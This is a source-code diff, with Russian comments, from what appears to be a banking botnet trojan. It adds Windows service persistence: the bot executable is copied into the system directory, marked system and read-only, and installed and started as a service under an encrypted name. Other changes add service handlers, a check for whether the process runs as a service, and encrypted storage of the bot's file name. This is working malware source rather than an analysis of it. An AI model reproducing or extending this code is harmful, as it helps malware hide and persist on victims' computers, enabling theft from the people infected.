@@ -8,6 +8,7 @@
 #include "BotHosts.h"
 #include "StrConsts.h"
 #include "Pipes.h"
+#include "BotService.h"
 //#include "DbgRpt.h"
 
 
@@ -34,6 +35,12 @@ class TBotData : public TBotObject
 {
 public:
 	TProcessType ProcessType;  // Тип запущенного процесса
+
+	// Данные для работы сервиса
+	string                ServiceName;
+	SERVICE_TABLE_ENTRYA  ServiceTable[1];
+	SERVICE_STATUS        ServiceStatus;
+	SERVICE_STATUS_HANDLE ServiceStatusHandle;
 };
 
 
@@ -55,14 +62,13 @@ DWORD BotWorkPathHash = 0;
 // Максимальный размер массива шифрованного файла
 #define MAX_CRYPTED_EXE_NAME_SIZE 50
 
-// Оригинальное имя ехе файла бота
-char OriginalBotExeName[] = {'W', 't', 'J', 'o', 'e', 'B', 't', '.', 'e', 'x', 'e',  0};
 
 // Шифрованное имя исполняемого файла бота
 char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";
 
-// Хэш имени бота
-DWORD BotExeNameHash = 0;
+
+DWORD BotExeNameHash        = 0; // Хэш имени бота
+DWORD BotServiceExeNameHash = 0; // Хэш имени сервиса бота
 
 //уид бота, инициализируется в функции BOT::Initialize(), также меняется если будет изменен префикс 
 //через функцию SetBankingMode()
@@ -322,41 +328,6 @@ string TBotApplication::MakeWorkPath(bool SystemPath)
 //----------------------------------------------------------------------------
 
 
-
-void TBotApplication::SaveSettings()
-{
-	// Функция сохраняет базовые настройки
-
-	// Сохраняем хосты
-	PCHAR HostsName = Hosts::GetFileName();
-	if (!FileExistsA(HostsName))
-		SaveHostsToFile(HostsName);
-	STR::Free(HostsName);
-
-	// Сохраняем префикс
-	string PrefixFile = PrefixFileName();
-	if (!FileExistsA(PrefixFile.t_str()))
-		SavePrefixToFile(PrefixFile.t_str());
-}
-//----------------------------------------------------------------------------
-
-void TBotApplication::DeleteSettings()
-{
-	// Функция удаляет ранее сохранённые настройки
-	// Удаляем хосты
-	PCHAR HostsName = Hosts::GetFileName();
-	pDeleteFileA(HostsName);
-	STR::Free(HostsName);
-
-	// Удаляем файл префикса
-	pDeleteFileA(PrefixFileName().t_str());
-}
-
-//----------------------------------------------------------------------------
-
-
-
-
 PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 {
 	// Функция возвращает рабочий каталог бота
@@ -484,6 +455,76 @@ namespace BOT
 
 		PIPE::StartProcessPipe(P);
 	}
+	//----------------------------------------------------------------------
+
+
+	//--------------------------------------------------
+	//  ServiceControlHandler - Функция управления
+	//                          сервисом
+	//--------------------------------------------------
+	void WINAPI ServiceControlHandler(DWORD Request)
+	{
+		if (Request == SERVICE_CONTROL_STOP || Request == SERVICE_CONTROL_SHUTDOWN)
+		{
+			COREDBG("BotService", "Получена команда остановки сервиса");
+			BotData->ServiceStatus.dwWin32ExitCode = 0;
+			BotData->ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
+			pSetServiceStatus(BotData->ServiceStatusHandle, &BotData->ServiceStatus);
+			return;
+        }
+
+
+		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);
+	}
+
+	//--------------------------------------------------
+	//  ServiceMain - главная функция сервиса бота
+	//--------------------------------------------------
+	void WINAPI ServiceMain(DWORD argc, char** argv)
+	{
+		// Инициализируем данные сервиса
+		COREDBG("BotService", "Запущена основная функци сервиса");
+		BotData->ServiceStatus.dwServiceType       = BOT_SERVICE_TYPE;
+		BotData->ServiceStatus.dwCurrentState      = SERVICE_START_PENDING;
+		BotData->ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+		BotData->ServiceStatus.dwWin32ExitCode     = 0;
+		BotData->ServiceStatus.dwServiceSpecificExitCode = 0;
+		BotData->ServiceStatus.dwCheckPoint        = 0;
+		BotData->ServiceStatus.dwWaitHint          = 0;
+
+        // Регистрируем обработчик команд сервиса
+		BotData->ServiceStatusHandle = (SERVICE_STATUS_HANDLE)pRegisterServiceCtrlHandlerA(BotData->ServiceName.t_str(), ServiceControlHandler);
+		if (BotData->ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)
+		{
+			// Не удалось зарегистрировать обработик команд сервиса
+			COREDBG("BotService", "Ошибка регистрации обработчика команд управления сервисом");
+			return;
+		}
+
+		BotData->ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);
+
+		// Запускаем бесконечный цикл ожидания прерывания работы сервиса
+		while (BotData->ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+		{
+			pSleep(1000);
+		}
+	}
+	//----------------------------------------------------------------------
+
+
+
+	//--------------------------------------------------
+	//  CheckIsService - Функция проверяет является ли
+	//                   процесс сервисом
+	//--------------------------------------------------
+	bool CheckIsService()
+	{
+
+		DWORD Hash1 = Bot->ApplicationName().Hash(0, true);
+		DWORD Hash2 = GetServiceFullExeName().Hash(0, true);
+		return Hash1 == Hash2;
+	}
 
 }
 //**************************************************************************
@@ -509,7 +550,9 @@ void BOT::Initialize(TProcessType ProcessType)
 
 
 	// Инициализиуем глобальные данные бота
-	BotData->ProcessType = ProcessType;
+	// Перед установкой типа процесса проверем не
+	// является ли процесс сервисом
+	BotData->ProcessType = (CheckIsService()) ? ProcessService : ProcessType;
 
 	// Создаём имя рабочей папки
 	GetWorkFolderHash();
@@ -562,9 +605,9 @@ PCHAR BOT::GetBotExeName()
 	// При необходимости генерируем имя бота
 	if (STR::IsEmpty(CryptedBotExeName))
 	{
-		PCHAR Name = UIDCrypt::CryptFileName(OriginalBotExeName, false);
+		PCHAR Name = UIDCrypt::CryptFileName(GetStr(EStrOriginalBotExeName).t_str(), false);
 
-		STR::Copy(Name, CryptedBotExeName, 0, StrCalcLength(Name) + 1);
+		STR::Copy(Name, CryptedBotExeName, 0, STRA::Length(Name) + 1);
 
 		STR::Free(Name);
 
@@ -602,6 +645,19 @@ PCHAR BOT::GetBotFullExeName()
     return Name;
 }
 //----------------------------------------------------------------------------
+
+//----------------------------------------------------
+//  GetServiceFullExeName - Функция возвращает полное
+//						    имя файла сервиса бота
+//----------------------------------------------------
+string BOT::GetServiceFullExeName()
+{
+	// Создаём имя ехе файла сервиса
+	return GetSpecialFolderPathA(CSIDL_SYSTEM, GetBotExeName());
+}
+//----------------------------------------------------------------------------
+
+
 
 HANDLE BotFileHandle = NULL;
 HANDLE BotMapHandle = NULL;
@@ -682,6 +738,105 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 
 
 //----------------------------------------------------
+// InstallService - Функция инсталирует ехе бота
+//                  как сервис
+// FileName - Имя ехе файла бота
+//----------------------------------------------------
+bool BOT::InstallService(const char* FileName)
+{
+	if (!FileExistsA((PCHAR)FileName))
+		return false;
+
+    COREDBG("BotCore", "Устанавливаем сервис бота");
+	// Копируем файл в системную директорию
+	string FN = GetServiceFullExeName();
+	if (FN.IsEmpty()) return false;
+
+	COREDBG("BotCore", "Создаём EXE бота %s", FN.t_str());
+    bool Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE) != FALSE;
+	if (Result)
+	{
+		pSetFileAttributesA(FN.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+
+		// Файл скопирован, инсталируем сервис
+		TService Service;
+		Service.Name        = GetStr(EStrServiceName);
+		Service.DisplayName = Service.Name;
+
+		COREDBG("BotCore", "Создаём сервис %s", Service.Name.t_str());
+
+		Result = Service.Install(FN.t_str());
+		if (Result)
+			Result = Service.Start();
+		if (Result)
+			COREDBG("BotCore", "Сервис успешно создан и запущен");
+		else
+			COREDBG("BotCore", "Ошибка создания и запуска сервиса %d", pGetLastError());
+
+		if (!Result)
+		{
+			COREDBG("BotCore", "Не удалось запустить сервис. Ошибка %d", pGetLastError());
+		}
+	}
+	return Result;
+}
+
+//----------------------------------------------------
+// UninstallService - Функция деинсталирует
+//                    сервис бота
+//----------------------------------------------------
+bool BOT::UninstallService()
+{
+	COREDBG("BotCore", "Деинсталируем сервис");
+
+	TService Service;
+	Service.Name = GetStr(EStrServiceName);
+
+	bool Result = Service.Uninstall();
+	if (Result)
+	{
+		// Удалем файл
+		string ExeName = GetServiceFullExeName();
+		COREDBG("BotCore", "Сервис деинсталирован. Удаляем ехе %s", ExeName.t_str());
+		DeleteBotFile(ExeName.t_str());
+	}
+	return Result;
+}
+
+
+
+//----------------------------------------------------
+// ExecuteService - Функция запускает выполнение
+//                  сервиса
+//----------------------------------------------------
+void BOT::ExecuteService()
+{
+	BotData->ServiceName = GetStr(EStrServiceName);
+
+	COREDBG("BotService", "Запущен сервис бота %s", BotData->ServiceName.t_str());
+
+	BotData->ServiceTable[0].lpServiceName = BotData->ServiceName.t_str();
+	BotData->ServiceTable[0].lpServiceProc = ServiceMain;
+
+	pStartServiceCtrlDispatcherA(BotData->ServiceTable);
+	COREDBG("BotService", "Сервис завершил работу");
+    pExitProcess(0);
+}
+
+
+//----------------------------------------------------
+// IsService - Функция возвращает истину если
+//             текущий процесс является сервисом
+//----------------------------------------------------
+bool BOT::IsService()
+{
+	return BotData->ProcessType == ProcessService;
+}
+
+
+
+
+//----------------------------------------------------
 //  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
 //----------------------------------------------------
 string BOT::BotExeMD5()
@@ -754,3 +909,43 @@ void BOT::Delete()
 		SendProcessMessage(ProcessService, Cmd);
     }
 }
+//----------------------------------------------------------------------------
+
+void BOT::SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists)
+{
+	// Функция сохраняет базовые настройки
+
+	// Сохраняем хосты
+	if (SaveHosts)
+	{
+		PCHAR HostsName = Hosts::GetFileName();
+		if (!IgnoreIfExists || !FileExistsA(HostsName))
+			SaveHostsToFile(HostsName);
+		STR::Free(HostsName);
+    }
+
+	// Сохраняем префикс
+	if (SavePrefix)
+	{
+		string PrefixFile = Bot->PrefixFileName();
+		if (!IgnoreIfExists || !FileExistsA(PrefixFile.t_str()))
+			SavePrefixToFile(PrefixFile.t_str());
+    }
+}
+//----------------------------------------------------------------------------
+
+void BOT::DeleteSettings()
+{
+	// Функция удаляет ранее сохранённые настройки
+	// Удаляем хосты
+	PCHAR HostsName = Hosts::GetFileName();
+	pDeleteFileA(HostsName);
+	STR::Free(HostsName);
+
+	// Удаляем файл префикса
+	pDeleteFileA(Bot->PrefixFileName().t_str());
+}
+
+//----------------------------------------------------------------------------
+
+
